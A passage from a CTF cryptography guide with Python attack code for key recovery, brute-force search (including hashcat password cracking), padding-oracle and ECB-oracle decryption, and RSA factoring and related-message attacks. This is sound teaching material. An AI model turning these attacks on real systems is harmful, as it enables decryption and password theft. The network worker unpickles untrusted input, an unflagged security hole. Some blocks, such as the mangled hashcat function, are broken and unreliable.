        bytes_at_pos = [key[pos] for key in key_samples]
        entropy = calculate_entropy(bytes_at_pos)
        positional_entropy.append(entropy)
        
        if entropy < 4.0:  # Low entropy threshold
            print(f"[!] Low entropy at position {pos}: {entropy:.2f} bits")
            unique_values = set(bytes_at_pos)
            print(f"    Unique values: {len(unique_values)}")
            print(f"    Most common: {Counter(bytes_at_pos).most_common(5)}")
    
    # Overall entropy
    all_bytes = [b for key in key_samples for b in key]
    overall = calculate_entropy(all_bytes)
    print(f"[*] Overall entropy: {overall:.2f} bits/byte (ideal: 8.0)")
    
    # Expected vs actual keyspace
    theoretical_keyspace = 256 ** key_length
    actual_unique_keys = len(set(tuple(k) for k in key_samples))
    print(f"[*] Unique keys in sample: {actual_unique_keys}/{len(key_samples)}")
    
    return positional_entropy

# Example: Analyze weak RNG output
def weak_key_generator(seed):
    """Simulated weak key generator"""
    import random
    random.seed(seed)
    
    # Weak: only uses lower 4 bits randomness
    return bytes([random.randint(0, 15) for _ in range(16)])

# Generate samples
samples = [weak_key_generator(i) for i in range(1000)]
# entropy_analysis = analyze_key_entropy(samples)
```

**Scenario: Character Set Reduction**

python

```python
import string

def detect_key_charset(ciphertext, plaintext_sample):
    """
    Determine key character set by analyzing encryption behavior
    
    Useful for reducing keyspace when key uses limited alphabet
    """
    # Test different character sets
    charsets = {
        'lowercase': string.ascii_lowercase,
        'uppercase': string.ascii_uppercase,
        'digits': string.digits,
        'alphanumeric': string.ascii_letters + string.digits,
        'printable': string.printable.strip(),
        'hex': '0123456789abcdef'
    }
    
    scores = {}
    
    for name, charset in charsets.items():
        # Try XOR with each character
        valid_count = 0
        
        for char in charset:
            result = bytes([c ^ ord(char) for c in ciphertext[:len(plaintext_sample)]])
            
            # Check if result is printable
            if all(32 <= b < 127 for b in result):
                valid_count += 1
        
        scores[name] = valid_count
        print(f"[*] Charset '{name}': {valid_count} valid results")
    
    # Best matching charset
    best = max(scores.items(), key=lambda x: x[1])
    print(f"[+] Likely charset: {best[0]}")
    
    return charsets[best[0]]

# Example
ct = bytes.fromhex('2c24311a3c')
pt_sample = b'flag{'

# charset = detect_key_charset(ct, pt_sample)
```

#### Pattern Recognition in Keys

**Scenario: Repeating Key Patterns**

python

```python
def find_key_period(ciphertext, known_plaintext_fragment, max_period=50):
    """
    Detect repeating key patterns (like Vigenère or repeating XOR)
    
    Args:
        ciphertext: encrypted data
        known_plaintext_fragment: known plaintext segment
        max_period: maximum key length to test
    """
    key_candidates = {}
    
    # Extract key fragment from known plaintext
    key_fragment = bytes([c ^ p for c, p in zip(ciphertext, known_plaintext_fragment)])
    frag_len = len(key_fragment)
    
    print(f"[*] Key fragment: {key_fragment.hex()}")
    
    # Test different periods
    for period in range(frag_len, min(max_period, len(ciphertext) // 2)):
        # Extend key by repetition
        extended_key = (key_fragment * ((period // frag_len) + 1))[:period]
        
        # Decrypt entire ciphertext
        plaintext = bytes([c ^ extended_key[i % period] for i, c in enumerate(ciphertext)])
        
        # Score based on printable characters
        printable_ratio = sum(32 <= b < 127 for b in plaintext) / len(plaintext)
        
        if printable_ratio > 0.9:  # High confidence threshold
            print(f"[+] Candidate key length: {period}")
            print(f"    Extended key: {extended_key.hex()}")
            print(f"    Printable ratio: {printable_ratio:.2%}")
            print(f"    Plaintext preview: {plaintext[:50]}")
            
            key_candidates[period] = extended_key
    
    return key_candidates

# Example
ciphertext = bytes.fromhex('1c0a1f081b491c0e1f0a1b5c0e1f0a1b591a0e1f')
known_start = b'The flag is: CTF{'

# candidates = find_key_period(ciphertext, known_start)
```

**Scenario: Predictable Key Structure**

python

```python
import re

def exploit_key_structure(key_format, known_parts, ciphertext, known_plaintext):
    """
    Exploit known key format to reduce search space
    
    Args:
        key_format: regex pattern for key structure
        known_parts: dictionary of known key components
        ciphertext: encrypted data
        known_plaintext: verification plaintext
    
    Example: Key format "USER####" where #### are digits
    """
    from Crypto.Cipher import AES
    from Crypto.Hash import SHA256
    import re
    
    # Parse format pattern
    # Example: "CTF2024_####" where #### is 4 hex digits
    
    if key_format == "CTF2024_????":  # 4 hex digits
        print("[*] Testing CTF2024_XXXX format (65536 combinations)")
        
        for i in range(0x10000):
            key_string = f"CTF2024_{i:04x}"
            key = SHA256.new(key_string.encode()).digest()[:16]
            
            try:
                cipher = AES.new(key, AES.MODE_ECB)
                plaintext = cipher.decrypt(ciphertext[:16])
                
                if plaintext[:len(known_plaintext)] == known_plaintext:
                    print(f"[+] Key found: {key_string}")
                    return key_string
            except:
                continue
    
    elif key_format == "YEAR_MONTH_DAY":
        # Date-based key: 2024-01-01 to 2024-12-31
        print("[*] Testing date-based keys (365 combinations)")
        
        for month in range(1, 13):
            for day in range(1, 32):
                key_string = f"2024-{month:02d}-{day:02d}"
                key = SHA256.new(key_string.encode()).digest()[:16]
                
                try:
                    cipher = AES.new(key, AES.MODE_ECB)
                    plaintext = cipher.decrypt(ciphertext[:16])
                    
                    if plaintext[:len(known_plaintext)] == known_plaintext:
                        print(f"[+] Key found: {key_string}")
                        return key_string
                except:
                    continue
    
    return None

# Example usage
ciphertext = bytes.fromhex('...')
known_text = b'flag{'

# key = exploit_key_structure("CTF2024_????", {}, ciphertext, known_text)
```

#### Meet-in-the-Middle Attacks

**Scenario: Double Encryption**

python

```python
def meet_in_the_middle_double_des(plaintext, ciphertext, keyspace_size=2**20):
    """
    Meet-in-the-middle attack on double encryption
    
    Reduces time complexity from O(n²) to O(n) with O(n) space
    
    Args:
        plaintext: known plaintext
        ciphertext: corresponding ciphertext  
        keyspace_size: reduced keyspace to search
    """
    from Crypto.Cipher import DES
    import random
    
    print(f"[*] Building forward encryption table ({keyspace_size} keys)...")
    
    # Forward table: plaintext -> intermediate (with key1)
    forward_table = {}
    
    for i in range(keyspace_size):
        # Generate candidate key1 (simplified: use counter as key material)
        key1 = i.to_bytes(8, 'big')[:8]
        
        try:
            cipher = DES.new(key1, DES.MODE_ECB)
            intermediate = cipher.encrypt(plaintext)
            forward_table[intermediate] = key1
        except:
            continue
        
        if i % 10000 == 0:
            print(f"  Progress: {i}/{keyspace_size}")
    
    print(f"[*] Searching backward from ciphertext ({keyspace_size} keys)...")
    
    # Backward table: ciphertext -> intermediate (with key2)
    for i in range(keyspace_size):
        key2 = i.to_bytes(8, 'big')[:8]
        
        try:
            cipher = DES.new(key2, DES.MODE_ECB)
            intermediate = cipher.decrypt(ciphertext)
            
            # Check for collision
            if intermediate in forward_table:
                key1 = forward_table[intermediate]
                print(f"[+] Keys found!")
                print(f"    Key1: {key1.hex()}")
                print(f"    Key2: {key2.hex()}")
                
                # Verify
                c1 = DES.new(key1, DES.MODE_ECB)
                c2 = DES.new(key2, DES.MODE_ECB)
                test_ct = c2.encrypt(c1.encrypt(plaintext))
                
                if test_ct == ciphertext:
                    return (key1, key2)
        except:
            continue
        
        if i % 10000 == 0:
            print(f"  Progress: {i}/{keyspace_size}")
    
    return None

# Example (simulated with reduced keyspace)
# pt = b'PLAINTXT'
# ct = b'\x8c\xa6\x4d\xe9\xc1\xb1\x23\xa7'
# keys = meet_in_the_middle_double_des(pt, ct, keyspace_size=2**16)
```

**Scenario: Cascaded Encryption with Known Intermediate**

python

```python
def attack_cascade_with_intermediate(plaintext, intermediate, ciphertext, keyspace):
    """
    Attack cascaded encryption when intermediate state is leaked
    
    E_k2(E_k1(plaintext)) = ciphertext
    If intermediate = E_k1(plaintext) is known, both keys can be recovered independently
    """
    from Crypto.Cipher import AES
    
    print("[*] Recovering key1 (plaintext -> intermediate)...")
    
    for key1_candidate in keyspace:
        cipher1 = AES.new(key1_candidate, AES.MODE_ECB)
        test_intermediate = cipher1.encrypt(plaintext)
        
        if test_intermediate == intermediate:
            print(f"[+] Key1 found: {key1_candidate.hex()}")
            
            # Now recover key2
            print("[*] Recovering key2 (intermediate -> ciphertext)...")
            
            for key2_candidate in keyspace:
                cipher2 = AES.new(key2_candidate, AES.MODE_ECB)
                test_ciphertext = cipher2.encrypt(intermediate)
                
                if test_ciphertext == ciphertext:
                    print(f"[+] Key2 found: {key2_candidate.hex()}")
                    return (key1_candidate, key2_candidate)
    
    return None

# [Inference] This attack demonstrates importance of hiding intermediate states
```

#### Parallel Brute-Force Optimization

**Scenario: Multi-Threaded Key Search**

python

```python
import multiprocessing as mp
from Crypto.Cipher import AES
import itertools

def test_key_batch(args):
    """Worker function to test a batch of keys"""
    key_batch, ciphertext, known_plaintext = args
    
    for key_bytes in key_batch:
        try:
            key = bytes(key_bytes)
            cipher = AES.new(key, AES.MODE_ECB)
            plaintext = cipher.decrypt(ciphertext[:16])
            
            if plaintext[:len(known_plaintext)] == known_plaintext:
                return key
        except:
            continue
    
    return None

def parallel_key_search(ciphertext, known_plaintext, key_charset, key_length, num_processes=None):
    """
    Parallel brute-force key search using all CPU cores
    
    Args:
        ciphertext: encrypted data
        known_plaintext: known plaintext for verification
        key_charset: possible key bytes (e.g., range(256))
        key_length: length of key in bytes
        num_processes: number of parallel workers (default: CPU count)
    """
    if num_processes is None:
        num_processes = mp.cpu_count()
    
    print(f"[*] Starting parallel search with {num_processes} processes")
    print(f"[*] Keyspace: {len(key_charset)}^{key_length} = {len(key_charset)**key_length}")
    
    # Generate all key combinations
    all_keys = itertools.product(key_charset, repeat=key_length)
    
    # Split into batches for parallel processing
    batch_size = 10000
    
    with mp.Pool(processes=num_processes) as pool:
        # Create batches
        while True:
            batch = list(itertools.islice(all_keys, batch_size))
            if not batch:
                break
            
            # Submit batch to worker pool
            result = pool.apply_async(test_key_batch, ((batch, ciphertext, known_plaintext),))
            
            # Check if key found
            try:
                found_key = result.get(timeout=0.1)
                if found_key:
                    print(f"[+] Key found: {found_key.hex()}")
                    pool.terminate()
                    return found_key
            except mp.TimeoutError:
                continue
    
    return None

# Example: 3-byte key from limited charset
# ct = bytes.fromhex('...')
# known = b'flag'
# charset = range(32, 127)  # Printable ASCII
# key = parallel_key_search(ct, known, charset, 3)
```

**Scenario: GPU-Accelerated Brute-Force**

python

```python
#!/usr/bin/env python3
"""
GPU-accelerated key search using hashcat

[Unverified] Requires proper hashcat installation and compatible GPU
"""

import subprocess
import os

def hashcat_bruteforce(hash_file, hash_type, charset, min_len, max_len): """ GPU-accelerated brute-force using hashcat

Args:
    hash_file: file containing hash to crack
    hash_type: hashcat hash mode (-m parameter)
    charset: character set to use
    min_len, max_len: password length range

Common hash types:
    0 = MD5
    100 = SHA1
    1400 = SHA256
    1700 = SHA512
    2500 = WPA/WPA2
"""

# Build hashcat command
cmd = [
    'hashcat',
    '-m', str(hash_type),
    '-a', '3',  # Brute-force attack
    hash_file,
    '--increment',
    '--increment-min', str(min_len),
    '--increment-max', str(max_len),
]

# Charset specification
if charset == 'lower':
    mask = '?l' * max_len
elif charset == 'upper':
    mask = '?u' * max_len
elif charset == 'digit':
    mask = '?d' * max_len
elif charset == 'alphanum':
    mask = '?a' * max_len
elif charset == 'hex':
    mask = '?h' * max_len
else:
    mask = charset

cmd.append(mask)

print(f"[*] Launching hashcat: {' '.join(cmd)}")

try:
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    # Parse output for cracked hash
    if "Cracked" in result.stdout:
        print("[+] Hash cracked!")
        # Extract password from potfile
        potfile = os.path.expanduser("~/.hashcat/hashcat.potfile")
        if os.path.exists(potfile):
            with open(potfile, 'r') as f:
                for line in f:
                    if hash_file in line:
                        password = line.split(':')[-1].strip()
                        print(f"[+] Password: {password}")
                        return password
    else:
        print("[-] Hash not cracked")
        
except FileNotFoundError:
    print("[!] Hashcat not found. Install with: apt install hashcat")

return None

# Example usage

"""

# Create hash file

echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt

# Crack MD5 with 4-6 digit password

password = hashcat_bruteforce('hash.txt', 0, 'digit', 4, 6) """
````

**Scenario: Distributed Brute-Force**
```python
import socket
import pickle
import threading

def distributed_coordinator(keyspace_chunks, worker_addresses, task_params):
    """
    Coordinator for distributed brute-force across multiple machines
    
    Args:
        keyspace_chunks: list of keyspace ranges to distribute
        worker_addresses: list of (host, port) tuples for workers
        task_params: parameters to send to workers (ciphertext, etc.)
    """
    results_queue = []
    found_event = threading.Event()
    
    def send_task_to_worker(worker_addr, chunk):
        """Send keyspace chunk to worker"""
        host, port = worker_addr
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            
            # Send task
            task = {
                'keyspace_chunk': chunk,
                'params': task_params
            }
            sock.sendall(pickle.dumps(task))
            
            # Wait for result
            result = pickle.loads(sock.recv(4096))
            
            if result.get('found'):
                print(f"[+] Worker {host}:{port} found key: {result['key']}")
                found_event.set()
                results_queue.append(result)
            
            sock.close()
            
        except Exception as e:
            print(f"[!] Error with worker {host}:{port}: {e}")
    
    # Distribute tasks
    threads = []
    for i, (worker, chunk) in enumerate(zip(worker_addresses, keyspace_chunks)):
        if found_event.is_set():
            break
        
        print(f"[*] Assigning chunk {i} to worker {worker}")
        t = threading.Thread(target=send_task_to_worker, args=(worker, chunk))
        t.start()
        threads.append(t)
    
    # Wait for completion
    for t in threads:
        t.join()
    
    if results_queue:
        return results_queue[0]['key']
    return None

def distributed_worker(listen_port):
    """
    Worker node that receives keyspace chunks and searches
    
    Run on each worker machine
    """
    from Crypto.Cipher import AES
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('0.0.0.0', listen_port))
    sock.listen(1)
    
    print(f"[*] Worker listening on port {listen_port}")
    
    while True:
        conn, addr = sock.accept()
        print(f"[*] Connection from {addr}")
        
        # Receive task
        task = pickle.loads(conn.recv(4096))
        keyspace_chunk = task['keyspace_chunk']
        params = task['params']
        
        ciphertext = params['ciphertext']
        known_plaintext = params['known_plaintext']
        
        # Search assigned keyspace
        print(f"[*] Searching keyspace chunk: {len(keyspace_chunk)} keys")
        
        for key_candidate in keyspace_chunk:
            try:
                cipher = AES.new(key_candidate, AES.MODE_ECB)
                plaintext = cipher.decrypt(ciphertext[:16])
                
                if plaintext[:len(known_plaintext)] == known_plaintext:
                    result = {'found': True, 'key': key_candidate.hex()}
                    conn.sendall(pickle.dumps(result))
                    return
            except:
                continue
        
        # Not found in this chunk
        result = {'found': False}
        conn.sendall(pickle.dumps(result))
        conn.close()

# Example usage (coordinator)
"""
# Split keyspace into chunks
keyspace = [bytes([a, b, c]) for a in range(256) for b in range(256) for c in range(256)]
chunk_size = len(keyspace) // 4  # 4 workers
chunks = [keyspace[i:i+chunk_size] for i in range(0, len(keyspace), chunk_size)]

# Worker machines
workers = [
    ('192.168.1.10', 9999),
    ('192.168.1.11', 9999),
    ('192.168.1.12', 9999),
    ('192.168.1.13', 9999)
]

params = {
    'ciphertext': bytes.fromhex('...'),
    'known_plaintext': b'flag{'
}

key = distributed_coordinator(chunks, workers, params)
"""
````

### Pattern-Based Key Inference

Extracting keys by identifying patterns in encryption behavior, implementation details, or mathematical relationships.

#### Statistical Pattern Analysis

**Scenario: Frequency Analysis for Key Recovery**

python

```python
from collections import Counter
import string

def frequency_analysis_xor_key(ciphertext, expected_language='english'):
    """
    Recover XOR key using frequency analysis
    
    Assumes plaintext is natural language text
    """
    # Expected character frequencies (English)
    english_freq = {
        'e': 12.70, 't': 9.06, 'a': 8.17, 'o': 7.51, 'i': 6.97,
        'n': 6.75, 's': 6.33, 'h': 6.09, 'r': 5.99, ' ': 13.0
    }
    
    print("[*] Analyzing ciphertext frequency patterns...")
    
    # Try each possible single-byte XOR key
    candidates = []
    
    for key_byte in range(256):
        decrypted = bytes([b ^ key_byte for b in ciphertext])
        
        # Count character frequencies
        text = decrypted.lower()
        counter = Counter(chr(b) for b in text if 32 <= b < 127)
        
        if not counter:
            continue
        
        # Calculate chi-squared statistic
        chi_squared = 0
        total_chars = sum(counter.values())
        
        for char, expected_freq in english_freq.items():
            observed = counter.get(char, 0)
            expected = (expected_freq / 100.0) * total_chars
            
            if expected > 0:
                chi_squared += ((observed - expected) ** 2) / expected
        
        # Lower chi-squared = better match to English
        candidates.append((key_byte, chi_squared, decrypted))
    
    # Sort by chi-squared (best match first)
    candidates.sort(key=lambda x: x[1])
    
    print("[*] Top candidates:")
    for i, (key, score, plaintext) in enumerate(candidates[:5]):
        preview = plaintext[:60].decode('ascii', errors='ignore')
        print(f"  {i+1}. Key: 0x{key:02x} ({chr(key) if 32 <= key < 127 else '?'}), Score: {score:.2f}")
        print(f"     Preview: {preview}")
    
    return candidates[0][0]  # Return most likely key

# Example
ciphertext = bytes.fromhex('1b5b545b5958081b565d5c5b08585d5c')
# key = frequency_analysis_xor_key(ciphertext)
```

**Scenario: Index of Coincidence for Key Length**

python

```python
def index_of_coincidence(text):
    """Calculate IC (Index of Coincidence) for text"""
    n = len(text)
    if n <= 1:
        return 0
    
    freq = Counter(text)
    ic = sum(f * (f - 1) for f in freq.values()) / (n * (n - 1))
    return ic

def find_repeating_key_length(ciphertext, max_length=30):
    """
    Determine repeating key length using Index of Coincidence
    
    IC for English: ~0.067
    IC for random: ~0.038
    """
    print("[*] Calculating IC for different key lengths...")
    
    ic_scores = {}
    
    for key_len in range(1, max_length + 1):
        # Split ciphertext into key_len groups
        groups = [ciphertext[i::key_len] for i in range(key_len)]
        
        # Calculate average IC across groups
        avg_ic = sum(index_of_coincidence(group) for group in groups) / key_len
        ic_scores[key_len] = avg_ic
        
        if avg_ic > 0.06:  # Close to English IC
            print(f"  Key length {key_len}: IC = {avg_ic:.4f} ***")
        else:
            print(f"  Key length {key_len}: IC = {avg_ic:.4f}")
    
    # Find key length with IC closest to English
    best_length = max(ic_scores.items(), key=lambda x: x[1])[0]
    print(f"[+] Most likely key length: {best_length}")
    
    return best_length

def recover_vigenere_key(ciphertext, key_length):
    """
    Recover Vigenère key using frequency analysis on each position
    """
    key = []
    
    for pos in range(key_length):
        # Extract bytes at this position
        subtext = ciphertext[pos::key_length]
        
        # Frequency analysis on subtext
        best_key_byte = frequency_analysis_xor_key(subtext)
        key.append(best_key_byte)
        
        print(f"[+] Position {pos}: 0x{best_key_byte:02x} ({chr(best_key_byte) if 32 <= best_key_byte < 127 else '?'})")
    
    return bytes(key)

# Example usage
"""
ct = bytes.fromhex('...')
key_len = find_repeating_key_length(ct)
key = recover_vigenere_key(ct, key_len)
"""
```

#### Implementation Flaw Patterns

**Scenario: ECB Mode Byte-at-a-Time Oracle**

python

```python
def ecb_oracle_attack(encryption_oracle, block_size=16):
    """
    Byte-at-a-time ECB decryption attack
    
    Args:
        encryption_oracle: function that encrypts controlled_input + secret
    
    Returns:
        Recovered secret data
    """
    print("[*] Starting ECB byte-at-a-time attack...")
    
    # Determine block size (if not known)
    # Feed increasing lengths and observe output growth
    
    # Recover secret byte by byte
    secret = b""
    
    while True:
        # Calculate padding needed
        padding_len = block_size - 1 - (len(secret) % block_size)
        padding = b'A' * padding_len
        
        # Encrypt with padding
        target_block_num = len(secret) // block_size
        ciphertext = encryption_oracle(padding)
        target_block = ciphertext[target_block_num * block_size:(target_block_num + 1) * block_size]
        
        # Build dictionary of possible next bytes
        found = False
        for byte_val in range(256):
            test_input = padding + secret + bytes([byte_val])
            test_ct = encryption_oracle(test_input)
            test_block = test_ct[target_block_num * block_size:(target_block_num + 1) * block_size]
            
            if test_block == target_block:
                secret += bytes([byte_val])
                print(f"[+] Recovered byte {len(secret)}: 0x{byte_val:02x} ({chr(byte_val) if 32 <= byte_val < 127 else '?'})")
                found = True
                break
        
        if not found:
            print("[*] Attack complete or padding reached")
            break
        
        # Check for padding/end
        if len(secret) > 0 and secret[-1] < 32:
            break
    
    return secret

# Example oracle
"""
SECRET = b"flag{secret_data_here}"

def oracle(user_input):
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    
    KEY = b'sixteen_byte_key'
    cipher = AES.new(KEY, AES.MODE_ECB)
    data = user_input + SECRET
    return cipher.encrypt(pad(data, 16))

recovered = ecb_oracle_attack(oracle)
"""
```

**Scenario: CBC Padding Oracle**

python

```python
def padding_oracle_attack(ciphertext, iv, padding_oracle, block_size=16):
    """
    CBC padding oracle attack to decrypt without key
    
    Args:
        ciphertext: encrypted data
        iv: initialization vector
        padding_oracle: function that returns True if padding is valid
        block_size: cipher block size
    """
    plaintext = b''
    
    # Process each block
    blocks = [iv] + [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    
    for block_num in range(1, len(blocks)):
        print(f"[*] Attacking block {block_num}/{len(blocks)-1}")
        
        current_block = blocks[block_num]
        previous_block = blocks[block_num - 1]
        
        decrypted_block = bytearray(block_size)
        
        # Attack each byte in block (right to left)
        for byte_pos in range(block_size - 1, -1, -1):
            # Calculate required padding value
            padding_value = block_size - byte_pos
            
            # Craft malicious IV
            crafted_iv = bytearray(previous_block)
            
            # Set known bytes to produce correct padding
            for k in range(byte_pos + 1, block_size):
                crafted_iv[k] = previous_block[k] ^ decrypted_block[k] ^ padding_value
            
            # Brute force current byte
            for guess in range(256):
                crafted_iv[byte_pos] = guess
                
                # Query oracle
                if padding_oracle(bytes(crafted_iv) + current_block):
                    # Valid padding found
                    decrypted_block[byte_pos] = guess ^ padding_value ^ previous_block[byte_pos]
                    
                    # Verify it's not false positive
                    if byte_pos == block_size - 1:
                        # Could be multiple valid paddings, verify
                        crafted_iv[byte_pos - 1] ^= 1
                        if not padding_oracle(bytes(crafted_iv) + current_block):
                            continue
                        crafted_iv[byte_pos - 1] ^= 1
                    
                    print(f"  [+] Byte {byte_pos}: 0x{decrypted_block[byte_pos]:02x}")
                    break
        
        plaintext += bytes(decrypted_block)
    
    # Remove padding
    padding_len = plaintext[-1]
    if all(b == padding_len for b in plaintext[-padding_len:]):
        plaintext = plaintext[:-padding_len]
    
    return plaintext

# Example oracle
"""
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

KEY = b'sixteen_byte_key'
IV = b'sixteen_byte_iv_'

def padding_oracle(data):
    try:
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        plaintext = cipher.decrypt(data)
        unpad(plaintext, 16)  # Raises exception on invalid padding
        return True
    except:
        return False

# Encrypt target
cipher = AES.new(KEY, AES.MODE_CBC, IV)
ct = cipher.encrypt(pad(b'secret_flag', 16))

# Attack
plaintext = padding_oracle_attack(ct, IV, padding_oracle)
"""
```

#### Mathematical Relationship Patterns

**Scenario: GCD-Based Key Recovery**

python

```python
from math import gcd
from Crypto.Util.number import long_to_bytes

def common_modulus_attack(n, e1, e2, c1, c2):
    """
    RSA common modulus attack
    
    When same message encrypted with same n but different e values
    """
    print("[*] Attempting common modulus attack...")
    
    # Extended GCD to find s1, s2 such that e1*s1 + e2*s2 = gcd(e1, e2)
    def egcd(a, b):
        if b == 0:
            return (a, 1, 0)
        else:
            g, y, x = egcd(b, a % b)
            return (g, x, y - (a // b) * x)
    
    g, s1, s2 = egcd(e1, e2)
    
    if g != 1:
        print("[!] e1 and e2 are not coprime, attack may fail")
        return None
    
    # Calculate m = (c1^s1 * c2^s2) mod n
    # Need to handle negative exponents
    if s1 < 0:
        c1 = pow(c1, -1, n)
        s1 = -s1
    if s2 < 0:
        c2 = pow(c2, -1, n)
        s2 = -s2
    
    m = (pow(c1, s1, n) * pow(c2, s2, n)) % n
    
    plaintext = long_to_bytes(m)
    print(f"[+] Recovered plaintext: {plaintext}")
    
    return plaintext

# Example
"""
n = 0x...  # Common modulus
e1 = 65537
e2 = 65539
c1 = 0x...  # Message encrypted with e1
c2 = 0x...  # Same message encrypted with e2

plaintext = common_modulus_attack(n, e1, e2, c1, c2)
"""
```

**Scenario: Related Message Attack**

python

```python
def franklin_reiter_related_message(n, e, c1, c2, relation_func):
    """
    Franklin-Reiter attack on related messages
    
    When m2 = f(m1) for known linear function f
    Example: m2 = m1 + r or m2 = a*m1 + b
    """
    from sage.all import *
    
    print("[*] Franklin-Reiter related message attack...")
    
    # Build polynomials
    P.<X> = PolynomialRing(Zmod(n))
    
    # f1(X) = X^e - c1
    f1 = X^e - c1
    
    # f2(X) = relation_func(X)^e - c2
    # Example: if m2 = m1 + r, then f2 = (X + r)^e - c2
    f2 = relation_func(X)^e - c2
    
    # Compute GCD of polynomials
    g = f1.gcd(f2)
    
    if g.degree() == 1:
        # Extract m1 from linear polynomial
        m1 = -g.coefficients()[0] / g.coefficients()[1]
        m1 = int(m1)
        
        print(f"[+] Message recovered: {long_to_bytes(m1)}")
        return m1
    else:
        print("[-] Attack failed - GCD degree is not 1")
        return None

# Example usage in Sage
"""
n = ...
e = 3  # Small exponent makes this attack effective
c1 = ...
c2 = ...
r = 42  # Known difference: m2 = m1 + 42

def relation(X):
    return X + r

m1 = franklin_reiter_related_message(n, e, c1, c2, relation)
"""
```

**Scenario: Fermat Factorization (Close Primes)**

python

```python
import math
from Crypto.Util.number import long_to_bytes

def fermat_factorization(n, max_iterations=100000):
    """
    Fermat's factorization for RSA with close primes
    
    Efficient when |p - q| is small
    """
    print("[*] Attempting Fermat factorization...")
    
    a = math.isqrt(n) + 1
    b2 = a * a - n
    
    for i in range(max_iterations):
        b = math.isqrt(b2)
        
        if b * b == b2:
            # Found factors
            p = a + b
            q = a - b
            
            print(f"[+] Factors found!")
            print(f"    p = {p}")
            print(f"    q = {q}")
            
            return (p, q)
        
        a += 1
        b2 = a * a - n
        
        if i % 10000 == 0:
            print(f"  Iteration {i}/{max_iterations}")
    
    print("[-] Factorization failed")
    return None

def recover_rsa_key_fermat(n, e, c):
    """
    Full RSA key recovery using Fermat factorization
    """
    # Factor n
    factors = fermat_factorization(n)
    
    if not factors:
        return None
    
    p, q = factors
    
    # Calculate private exponent
    phi = (p - 1) * (q - 1)
    d = pow(e, -1, phi)
    
    # Decrypt
    m = pow(c, d, n)
    plaintext = long_to_bytes(m)
    
    print(f"[+] Decrypted message: {plaintext}")
    
    return plaintext

# Example: RSA with close primes
"""
p = next_prime(2^512)
q = next_prime(p + 1000)  # Very close to p
n = p * q
e = 65537

# This n is vulnerable to Fermat factorization
"""
```

### Important Related Topics

For comprehensive key recovery techniques, consider these essential areas:

- **Weak Random Number Generators** - LCG prediction, Mersenne Twister state recovery, PRNG seed extraction
- **Nonce Reuse Attacks** - ECDSA/DSA nonce reuse, stream cipher nonce reuse, authentication bypass
- **Side-Channel Attacks** - Cache timing, power analysis, acoustic cryptanalysis, electromagnetic emanations
- **Algebraic Attacks** - Gröbner basis methods, SAT solver approaches, linear/differential cryptanalysis

---

## Practical CTF Patterns

#### ROT-N Variants

**Classic ROT13**

```python
def rot13(text):
    """Standard ROT13 - Caesar cipher with shift 13"""
    result = []
    for char in text:
        if 'a' <= char <= 'z':
            result.append(chr((ord(char) - ord('a') + 13) % 26 + ord('a')))
        elif 'A' <= char <= 'Z':
            result.append(chr((ord(char) - ord('A') + 13) % 26 + ord('A')))
        else:
            result.append(char)
    return ''.join(result)

# Test
plaintext = "CTF{hidden_flag}"
ciphertext = rot13(plaintext)
print(f"Encrypted: {ciphertext}")
print(f"Decrypted: {rot13(ciphertext)}")  # ROT13 is self-inverse
```

**Generic Caesar Cipher (ROT-N) Brute Force**

```python
def caesar_bruteforce(ciphertext):
    """Try all 26 possible shifts"""
    results = []
    
    for shift in range(26):
        decrypted = []
        for char in ciphertext:
            if 'a' <= char <= 'z':
                decrypted.append(chr((ord(char) - ord('a') - shift) % 26 + ord('a')))
            elif 'A' <= char <= 'Z':
                decrypted.append(chr((ord(char) - ord('A') - shift) % 26 + ord('A')))
            else:
                decrypted.append(char)
        
        plaintext = ''.join(decrypted)
        
        # Score based on common English patterns
        score = 0
        if 'the' in plaintext.lower():
            score += 3
        if 'CTF{' in plaintext or 'flag{' in plaintext:
            score += 10
        if any(word in plaintext.lower() for word in ['and', 'is', 'it', 'to']):
            score += 1
        
        results.append({
            'shift': shift,
            'plaintext': plaintext,
            'score': score
        })
    
    # Return sorted by score
    return sorted(results, key=lambda x: x['score'], reverse=True)

# Usage
ciphertext = "FWI{klgghq_iodn}"
best_results = caesar_bruteforce(ciphertext)
for result in best_results[:3]:
    print(f"Shift {result['shift']}: {result['plaintext']} (score: {result['score']})")
```

**ROT47 (Extends to All Printable ASCII)**

```python
def rot47(text):
    """ROT47 - Applies to all printable ASCII (33-126)"""
    result = []
    for char in text:
        if 33 <= ord(char) <= 126:
            # Shift within printable ASCII range
            result.append(chr(33 + (ord(char) - 33 + 47) % 94))
        else:
            result.append(char)
    return ''.join(result)

# Self-inverse like ROT13
plaintext = "CTF{r0t47_1s_fun!}"
encrypted = rot47(plaintext)
decrypted = rot47(encrypted)
print(f"Original: {plaintext}")
print(f"Encrypted: {encrypted}")
print(f"Decrypted: {decrypted}")
```

**Custom Alphabet Substitution**

```python
def custom_alphabet_cipher(text, key_alphabet):
    """
    Substitution cipher with custom alphabet
    key_alphabet: 26-character string defining substitution
    """
    normal = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    
    if len(key_alphabet) != 26:
        raise ValueError("Key alphabet must be 26 characters")
    
    trans_table = str.maketrans(
        normal + normal.lower(),
        key_alphabet.upper() + key_alphabet.lower()
    )
    
    return text.translate(trans_table)

def break_substitution_cipher(ciphertext):
    """
    Break substitution cipher using frequency analysis
    """
    # English letter frequency (approximate)
    english_freq = 'ETAOINSHRDLCUMWFGYPBVKJXQZ'
    
    # Count letter frequency in ciphertext
    from collections import Counter
    letter_counts = Counter(c.upper() for c in ciphertext if c.isalpha())
    cipher_freq = ''.join([letter for letter, count in letter_counts.most_common()])
    
    # Create mapping
    mapping = {}
    for i, cipher_letter in enumerate(cipher_freq[:26]):
        if i < len(english_freq):
            mapping[cipher_letter] = english_freq[i]
            mapping[cipher_letter.lower()] = english_freq[i].lower()
    
    # Decrypt using mapping
    decrypted = []
    for char in ciphertext:
        if char in mapping:
            decrypted.append(mapping[char])
        else:
            decrypted.append(char)
    
    return {
